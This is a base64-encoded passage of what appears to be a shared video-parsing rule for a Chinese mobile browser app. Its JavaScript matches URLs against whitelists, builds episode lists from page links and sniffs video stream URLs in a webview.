xcXFxcXFwiYmFpZHVcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJ6bWsuXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwic3ViaGRcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJ0aHVuZGVyXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwieGluanVjXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwiZ3JhYjRrXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwiL2J0XFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwianNyMTBcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJhc3NydFxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcInF1YXJrXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICBdO1xcXFxuICAgICAgICAgICAgICAgIGxldCBpbldoaXRlID0gd2hpdGUuZmlsdGVyKGl0ID0+IHVybC5pbmNsdWRlcyhpdCkpLmxlbmd0aCA+IDA7XFxcXG4gICAgICAgICAgICAgICAgaWYgKGluV2hpdGUpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgLy/ot7PnvZHpobVcXFxcbiAgICAgICAgICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5vcGVuKEpTT04uc3RyaW5naWZ5KHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuivpuaDhVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS95c2Z4P3J1bGU9XFxcXFxcXCIgKyBydWxlICsgXFxcXFxcXCImcj1cXFxcXFxcIiArIHJ1bGUgKyBcXFxcXFxcIiMjXFxcXFxcXCIgKyB1cmwsXFxcXG4gICAgICAgICAgICAgICAgICAgIH0pKVxcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIC8vQUnop6PmnpBcXFxcbiAgICAgICAgICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5vcGVuKEpTT04uc3RyaW5naWZ5KHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBkb2N1bWVudC50aXRsZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UvcD9ydWxlPVxcXFxcXFwiICsgcnVsZSArIFxcXFxcXFwiJnI9XFxcXFxcXCIgKyBydWxlICsgXFxcXFxcXCImdT1cXFxcXFxcIiArIGZ5X2JyaWRnZV9hcHAuYmFzZTY0RW5jb2RlKHVybCksXFxcXG4gICAgICAgICAgICAgICAgICAgIH0pKVxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0sIGlucHV0LCBydWxlKTtcXFxcbiAgICAgICAgfSBlbHNlIGlmICghaW5wdXQuc3RhcnRzV2l0aChcXFxcXFxcImh0dHBcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgICAgIGxvZyhpbnB1dCk7XFxcXG4gICAgICAgICAgICAvL+iDveWUpOi1t0FQUOeahOeZveWQjeWNlVxcXFxuICAgICAgICAgICAgbGV0IHdoaXRlID0gW1xcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwicWtsaW5rXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgXFxcXFxcXCJiZG5ldGRpc2tcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBcXFxcXFxcInh1bmxlaWFwcFxcXFxcXFwiXFxcXG4gICAgICAgICAgICBdO1xcXFxuICAgICAgICAgICAgbGV0IGluV2hpdGUgPSB3aGl0ZS5maWx0ZXIoaXQgPT4gaW5wdXQuc3RhcnRzV2l0aChpdCkpLmxlbmd0aCA+IDA7XFxcXG4gICAgICAgICAgICBpZiAoIWluV2hpdGUpIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICByZXR1cm4gJC50b1N0cmluZygodXJsLCBydWxlKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5vcGVuVGhpcmRBcHAgJiYgZnlfYnJpZGdlX2FwcC5vcGVuVGhpcmRBcHAodXJsKTtcXFxcbiAgICAgICAgICAgIH0sIGlucHV0LCBydWxlKVxcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgbGV0IHdoaXRlID0gW1xcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwidXJsPVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwiZnNvdS5jb21cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBcXFxcXFxcImJpbmcuXFxcXFxcXCIsICAgICAgICAgICAgICAgIFxcXFxuICAgICAgICAgICAgXTtcXFxcbiAgICAgICAgICAgIGxldCBpbldoaXRlID0gd2hpdGUuZmlsdGVyKGl0ID0+IGlucHV0LmluY2x1ZGVzKGl0KSkubGVuZ3RoID4gMDtcXFxcbiAgICAgICAgICAgIGlmIChpbldoaXRlKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgbGV0IHJlZyA9IG5ldyBSZWdFeHAoXFxcXFxcXCJbXFxcXFxcXFx1NGUwMC1cXFxcXFxcXHU5ZmE1XStcXFxcXFxcIiwgXFxcXFxcXCJnXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgbGV0IHIgPSBkZWNvZGVVUklDb21wb25lbnQoaW5wdXQpO1xcXFxuICAgICAgICAgICAgaWYgKHJlZy50ZXN0KHIpIHx8IChpbnB1dC5zdGFydHNXaXRoKG9yaWdpbikgJiYgaW5wdXQubGVuZ3RoIC0gb3JpZ2luLmxlbmd0aCA+IDIpKSB7XFxcXG4gICAgICAgICAgICAgICAgLy/mnInkuK3mlofvvIzlupTor6XmmK/lnKjmkJzntKLvvIzot7PmlrDpobXpnaJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJC50b1N0cmluZygodXJsLCBydWxlKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAub3BlbihKU09OLnN0cmluZ2lmeSh7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLor6bmg4VcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UveXNmeD9ydWxlPVxcXFxcXFwiICsgcnVsZSArIFxcXFxcXFwiJnI9XFxcXFxcXCIgKyBydWxlICsgXFxcXFxcXCIjI1xcXFxcXFwiICsgdXJsLFxcXFxuICAgICAgICAgICAgICAgICAgICB9KSk7XFxcXG4gICAgICAgICAgICAgICAgfSwgaW5wdXQsIHJ1bGUpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgfSwgcnVsZSwgb3JpZ2luKTtcXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLkuoznuqfop6PmnpBcXFwiLFxcXCJwYXRoXFxcIjpcXFwicFxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbnZhciBkID0gW107XFxcXG5sZXQgdXJsID0gYmFzZTY0RGVjb2RlKGdldFBhcmFtKFxcXFxcXFwidVxcXFxcXFwiKSk7XFxcXG5sZXQgbGlzdCA9IHN0b3JhZ2UwLmdldEl0ZW0oXFxcXFxcXCJ3aGl0ZVxcXFxcXFwiLCBbXSk7XFxcXG5sZXQgaW5XaGl0ZSA9IGxpc3QuaW5jbHVkZXModXJsKTtcXFxcbmxldCBkID0gW107XFxcXG5pZiAoIWluV2hpdGUpIHtcXFxcbiAgICBsZXQgaHRtbCA9IHJlcXVlc3QodXJsKTtcXFxcbiAgICBsZXQgd2ViID0gZ2V0SXRlbSgnd2ViJywgJzAnKSA9PSBcXFxcXFxcIjFcXFxcXFxcIjtcXFxcbiAgICBsZXQgcnVsZSA9IGdldFBhcmFtKFxcXFxcXFwiclxcXFxcXFwiKTtcXFxcbiAgICBsZXQgcGFyc2UgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvcGFyc2VcXFxcXFxcIik7XFxcXG4gICAgZCA9IHBhcnNlKHJ1bGUsIHdlYiwgdXJsLCBodG1sKTtcXFxcbn1cXFxcbmlmIChkLmxlbmd0aCA9PSAwKSB7XFxcXG4gICAgLy/ljLnphY3lpLHotKVcXFxcbiAgICBsZXQgaXRlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3VcXFxcXFxcIikoZ2V0UGFyYW0oXFxcXFxcXCJyXFxcXFxcXCIpLCBnZXRIb21lKHVybCkpO1xcXFxuICAgIGxldCBqcyA9ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgaWYgKGRvY3VtZW50LnRpdGxlICYmIGRvY3VtZW50LnRpdGxlLmxlbmd0aCkge1xcXFxuICAgICAgICAgICAgICAgIGxldCByID0gJCQkKCkubGF6eVJ1bGUoKHQpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgc2V0UGFnZVRpdGxlKHQpO1xcXFxuICAgICAgICAgICAgICAgIH0sIGRvY3VtZW50LnRpdGxlKTtcXFxcbiAgICAgICAgICAgICAgICBmeV9icmlkZ2VfYXBwLnBhcnNlTGF6eVJ1bGUocik7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAubG9nKGUudG9TdHJpbmcoKSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcbiAgICBsZXQganMyID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3g1YWlcXFxcXFxcIikoZ2V0UGFyYW0oXFxcXFxcXCJyXFxcXFxcXCIpLCB1cmwpO1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6IHVybCxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwieDVfd2Vidmlld19zaW5nbGVcXFxcXFxcIixcXFxcbiAgICAgICAgZGVzYzogXFxcXFxcXCJmbG9hdCYmMTAwJVxcXFxcXFwiLFxcXFxuICAgICAgICBwaWNfdXJsOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAganM6IGpzICsgXFxcXFxcXCI7XFxcXFxcXFxuXFxcXFxcXCIgKyBqczIsXFxcXG4gICAgICAgICAgICB1cmxJbnRlcmNlcHRvcjogaXRlLFxcXFxuICAgICAgICAgICAgY2FuQmFjazogdHJ1ZSxcXFxcbiAgICAgICAgICAgIGZsb2F0VmlkZW86IHRydWUsXFxcXG4gICAgICAgICAgICBqc0xvYWRpbmdJbmplY3Q6IHRydWVcXFxcbiAgICAgICAgfVxcXFxuICAgIH0pO1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVcXFxcXFxcIixcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIGlkOiB1cmxcXFxcbiAgICAgICAgfVxcXFxuICAgIH0pO1xcXFxuICAgIGlmICghaW5XaGl0ZSkge1xcXFxuICAgICAgICB0b2FzdChcXFxcXFxcIkFJ5Yy56YWN5aSx6LSl77yM5bey5L2/55SoWDXliqDovb1cXFxcXFxcIik7XFxcXG4gICAgfVxcXFxuICAgIHNldFJlc3VsdChkKTtcXFxcbn0gZWxzZSB7XFxcXG4gICAgc2V0UmVzdWx0KGQpO1xcXFxufVxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuS6jOe6p3BhcnNlXFxcIixcXFwicGF0aFxcXCI6XFxcInBhcnNlXFxcIixcXFwicnVsZVxcXCI6XFxcIiQuZXhwb3J0cyA9IGZ1bmN0aW9uKHJ1bGUsIHdlYiwgdXJsLCBodG1sKSB7XFxcXG4gICAgbGV0IGQgPSBbXTtcXFxcblxcXFxuICAgIGxldCBhbGlzdCA9IHBkZmEoaHRtbCwgXFxcXFxcXCJib2R5JiZhXFxcXFxcXCIpO1xcXFxuICAgIGxldCBhcnIgPSBhbGlzdC5tYXAoaXQgPT4ge1xcXFxuICAgICAgICByZXR1cm4ge1xcXFxuICAgICAgICAgICAgLy9odG1sOiBpdCxcXFxcbiAgICAgICAgICAgIHRleHQ6IHBkZmgoaXQsIFxcXFxcXFwiYSYmVGV4dFxcXFxcXFwiKSxcXFxcbiAgICAgICAgICAgIHRpdGxlOiBwZGZoKGl0LCBcXFxcXFxcImEmJnRpdGxlXFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgaHJlZjogcGQoaXQsIFxcXFxcXFwiYSYmaHJlZlxcXFxcXFwiLCB1cmwpXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcbiAgICAvL2xvZyhhcnIpO1xcXFxuICAgIGxldCBkZWJ1ZyA9IGZhbHNlO1xcXFxuXFxcXG4gICAgZnVuY3Rpb24gY2xlYXJUZXh0KGl0KSB7XFxcXG4gICAgICAgIHJldHVybiBpdC5yZXBsYWNlKC/nrKx86ZuGfOeroC9nLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICB9XFxcXG5cXFxcbiAgICBmdW5jdGlvbiBpc01vdmllKGl0KSB7XFxcXG4gICAgICAgIGlmIChpdCA9PSBudWxsIHx8IGl0LnRleHQgPT0gbnVsbCkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGxldCB0aXQgPSBpdC50aXRsZSB8fCBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgICAgICBpdCA9IGl0LnRleHQgfHwgXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICAgICAgaWYgKGl0ID09IFxcXFxcXFwiXFxcXFxcXCIgfHwgaXQubGVuZ3RoID4gOCkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIC8v5o6S6ZmkXFxcXG4gICAgICAgIGxldCByZWcgPSAvXFxcXFxcXFwufOmrmOa4heebtOaSrXzlhpnnnJ/mjqjojZB85b2x6ZmifOW9seinhnzok53lhYnnlLXlvbF86auY5riF55S15b2xfOesrOS4gOWto3znrKzkuozlraN856ys5LiJ5a2jfOesrOWbm+Wto3znrKzkupTlraMvO1xcXFxuICAgICAgICBpZiAodGl0ICE9IFxcXFxcXFwiXFxcXFxcXCIgJiYgIXRpdC5pbmNsdWRlcyhpdCkgfHwgcmVnLnRlc3QoaXQpKSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmV0dXJuIGl0Lm1hdGNoKC/ljp/nlLt85aSH55SofOiTneWFiXzotoXmuIV86auY5riFfOato+eJh3zpn6nniYh8NEt8NGt8MTA4MFB8NzIwUHxUQ3xIRHxCRC8pXFxcXG4gICAgfVxcXFxuXFxcXG4gICAgZnVuY3Rpb24gbm90Q2hhcHRlcihpdCkge1xcXFxuICAgICAgICBpZiAoaXQgPT0gbnVsbCB8fCBpdC50ZXh0ID09IG51bGwpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiB0cnVlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiBpdC50ZXh0Lm1hdGNoKC9bMC05XVxcXFxcXFxcLlswLTld5YiGLyk7XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgZnVuY3Rpb24gaXNDaGFwdGVyKGl0LCBwcmUsIG5leHQpIHtcXFxcbiAgICAgICAgaWYgKG5vdENoYXB0ZXIoaXQpKSB7XFxcXG4gICAgICAgICAgICAvL+S8mOWFiOaOkumZpFxcXFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIC8v5Yik5pat5piv5LiN5piv55S15b2xXFxcXG4gICAgICAgIGlmIChpc01vdmllKGl0KSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIHRydWU7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmV0dXJuIGlzQ2hhcHRlcjAoaXQsIHByZSkgfHwgaXNDaGFwdGVyMChpdCwgbmV4dCk7XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgZnVuY3Rpb24gZ2V0Q2hhcHRlck51bShpdCkge1xcXFxuICAgICAgICBpZiAoaXQgPT0gbnVsbCB8fCBpdC50ZXh0ID09IG51bGwpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiAtMTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpdCA9IGl0LnRleHQgfHwgXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICAgICAgaWYgKGl0ID09IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiAtMTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpdCA9IGNsZWFyVGV4dChpdCk7XFxcXG4gICAgICAgIGxldCByZWcgPSAvXlswLTldKiQvO1xcXFxuICAgICAgICBpZiAoIXJlZy50ZXN0KGl0KSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIC0xO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGl0ID0gcGFyc2VJbnQoaXQpO1xcXFxuICAgICAgICBpZiAoaXNOYU4oaXQpKSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gLTE7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgaWYgKGl0ID4gMTkwMCAmJiBpdCA8IDIxMDApIHtcXFxcbiAgICAgICAgICAgIHJldHVybiAtMTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gaXQ7XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgZnVuY3Rpb24gaXNDaGFwdGVyMChpdCwgYnJvdGhlcikge1xcXFxuICAgICAgICAvKmlmIChkZWJ1Zykge1xcXFxuICAgICAgICAgICAgbG9nKHtcXFxcbiAgICAgICAgICAgICAgICBpdDogaXQsXFxcXG4gICAgICAgICAgICAgICAgYnJvdGhlcjogYnJvdGhlclxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH0qL1xcXFxuICAgICAgICBpdCA9IGdldENoYXB0ZXJOdW0oaXQpO1xcXFxuICAgICAgICAvL2lmIChkZWJ1ZykgbG9nKGl0KTtcXFxcbiAgICAgICAgaWYgKGl0IDwgMCkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGJyb3RoZXIgPSBnZXRDaGFwdGVyTnVtKGJyb3RoZXIpO1xcXFxuICAgICAgICAvL2lmIChkZWJ1ZykgbG9nKGJyb3RoZXIpO1xcXFxuICAgICAgICBpZiAoYnJvdGhlciA8IDApIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBmYWxzZTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gaXQgLSBicm90aGVyIDwgMiAmJiBpdCAtIGJyb3RoZXIgPiAtMjtcXFxcbiAgICB9XFxcXG5cXFxcbiAgICBsZXQgX3dlYiA9ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICBsZXQgdXJscyA9IF9nZXRVcmxzKCk7XFxcXG4gICAgICAgIGxldCByZWcgPSAvXFxcXFxcXFwuaHRtbHxcXFxcXFxcXC5jc3N8XFxcXFxcXFwuanMvO1xcXFxuICAgICAgICBmb3IgKGxldCBrIGluIHVybHMpIHtcXFxcbiAgICAgICAgICAgIGlmICghcmVnLnRlc3QodXJsc1trXSkgJiYgdXJsc1trXS5tYXRjaCgvXFxcXFxcXFwubXA0fFxcXFxcXFxcLm0zdTgvKSkge1xcXFxuICAgICAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAubG9nKHVybHNba10pO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBmeV9icmlkZ2VfYXBwLmdldEhlYWRlclVybCh1cmxzW2tdLnJlcGxhY2UoLy4qP3VybD0vLCBcXFxcXFxcIlxcXFxcXFwiKSkgKyBcXFxcXFxcIiNpZ25vcmVJbWc9dHJ1ZSNcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgIH0pO1xcXFxuXFxcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcXFxuICAgICAgICBsZXQgdCA9IGl0LnRleHQ7XFxcXG4gICAgICAgIGlmICghaXQuaHJlZiB8fCBpdC5ocmVmID09IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgIGNvbnRpbnVlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGxldCBwcmUgPSBpID09IDAgPyBudWxsIDogYXJyW2kgLSAxXTtcXFxcbiAgICAgICAgbGV0IG5leHQgPSBpID09IChhcnIubGVuZ3RoIC0gMSkgPyBudWxsIDogYXJyW2kgKyAxXTtcXFxcbiAgICAgICAgaWYgKGlzQ2hhcHRlcihpdCwgcHJlLCBuZXh0KSkge1xcXFxuICAgICAgICAgICAgaWYgKHdlYikge1xcXFxuICAgICAgICAgICAgICAgIHZhciB1cmx4ID0gXFxcXFxcXCJ3ZWJSdWxlOi8vXFxcXFxcXCIgKyBpdC5ocmVmICsgXFxcXFxcXCJAXFxcXFxcXCIgKyBfd2ViO1xcXFxuICAgICAgICAgICAgICAgIHZhciBleHRyYXggPSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGpzTG9hZGluZ0luamVjdDogdHJ1ZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6IGl0LmhyZWYsXFxcXG4gICAgICAgICAgICAgICAgICAgIGJsb2NrUnVsZXM6IFsnLm00YScsICcubXAzJywgJy5mbHYnLCAnLmF2aScsICcuM2dwJywgJy5tcGVnJywgJy53bXYnLCAnLm1vdicsICcucm12YicsICcuZ2lmJywgJy5qcGVnJywgJy5wbmcnLCAnLmljbycsICcuc3ZnJ11cXFxcbiAgICAgICAgICAgICAgICB9O1xcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICB2YXIgdXJseCA9IFxcXFxcXFwidmlkZW86Ly9cXFxcXFxcIiArIGl0LmhyZWY7XFxcXG4gICAgICAgICAgICAgICAgdmFyIGV4dHJheCA9IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6IGl0LmhyZWZcXFxcbiAgICAgICAgICAgICAgICB9O1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogdCxcXFxcbiAgICAgICAgICAgICAgICB1cmw6IHVybHgsXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8zXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IGV4dHJheFxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgaWYgKGQubGVuZ3RoID09IDApIHtcXFxcbiAgICAgICAgcmV0dXJuIGQ7XFxcXG4gICAgfSBlbHNlIHtcXFxcblxcXFxuICAgICAgICBkLnNwbGljZSgwLCAwLCB7XFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLwn5SXXFxcXFxcXCIgKyB1cmwsXFxcXG4gICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3lzZng/cnVsZT1cXFxcXFxcIiArIHJ1bGUgKyBcXFxcXFxcIiZyPVxcXFxcXFwiICsgcnVsZSArIFxcXFxcXFwiIyNcXFxcXFxcIiArIHVybCxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZGVzYzogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIHBpY191cmw6IFxcXFxcXFwiXFxcXFxcXCJcXFxcbiAgICAgICAgfSk7XFxcXG5cXFxcblxcXFxuICAgICAgICAvL+S4uue6v+i3r+WKoOWIhuWJsue6v1xcXFxuICAgICAgICBsZXQgZDIgPSBbXTtcXFxcbiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBkLmxlbmd0aDsgaSsrKSB7XFxcXG4gICAgICAgICAgICBkMi5wdXNoKGRbaV0pO1xcXFxuICAgICAgICAgICAgaWYgKGkgPCBkLmxlbmd0aCAtIDEpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgaXQgPSBkW2ldO1xcXFxuICAgICAgICAgICAgICAgIGxldCB0MSA9IHBhcnNlSW50KGNsZWFyVGV4dChpdC50aXRsZSkpO1xcXFxuICAgICAgICAgICAgICAgIGxldCBuZXh0ID0gZFtpICsgMV07XFxcXG4gICAgICAgICAgICAgICAgbGV0IHQyID0gcGFyc2VJbnQoY2xlYXJUZXh0KG5leHQudGl0bGUpKTtcXFxcbiAgICAgICAgICAgICAgICBpZiAodDIgLSB0MSA+IDEgfHwgdDEgLSB0MiA+IDEpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgZDIucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJiaWdfYmxhbmtfYmxvY2tcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICAgICAgZDIucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lX2JsYW5rXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIGQyLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmlnX2JsYW5rX2Jsb2NrXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGQyLnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5Yy56YWN5pyJ6K+v77yf54K55oiR5LiN5YaN5Yy56YWN5q2k6aG16Z2iXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgodXJsKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgY29uZmlybSh7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIua4qemmqOaPkOekulxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBjb250ZW50OiBcXFxcXFxcIuWmguaenOWPquaYr+WNleasoeWMuemFjeWksei0pe+8jOeCueWHu+S4i+aWueWPlua2iOaMiemSruWIt+aWsOmhtemdoumHjeaWsOWMuemFje+8jOWmguaenOehruiupOaXoOazleWMuemFje+8jOeCueWHu+S4i+aWueehruWumuaMiemSruWKoOWFpeeZveWQjeWNlVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBjYW5jZWw6IFxcXFxcXFwicmVmcmVzaFBhZ2UoKVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBjb25maXJtOiAkLnRvU3RyaW5nKCh1cmwpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBsaXN0ID0gc3RvcmFnZTAuZ2V0SXRlbShcXFxcXFxcIndoaXRlXFxcXFxcXCIsIFtdKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxpc3QucHVzaCh1cmwpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgc3RvcmFnZTAuc2V0SXRlbShcXFxcXFxcIndoaXRlXFxcXFxcXCIsIGxpc3QpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5bey5Yqg5YWl55m95ZCN5Y2VXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSwgdXJsKVxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIlxcXFxuICAgICAgICAgICAgfSwgdXJsKSxcXFxcb